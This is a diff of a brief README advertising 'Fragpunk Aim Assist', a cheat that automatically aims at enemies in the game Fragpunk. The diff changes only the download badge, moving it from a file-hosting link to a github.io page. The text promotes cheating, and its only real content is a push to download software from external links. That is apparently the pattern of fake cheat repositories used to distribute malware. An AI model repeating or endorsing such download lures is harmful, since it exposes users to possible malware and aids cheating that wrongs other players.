@@ -1,6 +1,6 @@
 Fragpunk Aim Assist is a tool or feature that helps players improve their aiming accuracy in Fragpunk by automatically adjusting the crosshair to align with enemy targets. It’s designed to make shooting more accessible, especially for players who may struggle with precision aiming, by offering assistance in the form of automatic targeting or subtle corrections to aim position.
 
-[![Download Fragpunk Aimassist](https://img.shields.io/badge/Download-FragpunkAimAssist%20-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Fragpunk Aimassist](https://img.shields.io/badge/Download-FragpunkAimAssist%20-blueviolet)](https://fragpunk-aim-assist.github.io/.github/)
 
 - **Auto-Aim**: The tool helps automatically adjust the player's aim toward nearby enemies, ensuring that the shots hit their intended target more consistently.
 - **Snap Aiming**: It makes it easier to "snap" to enemies when aiming near them, reducing the effort and reaction time needed to target opponents, especially in fast-paced situations.
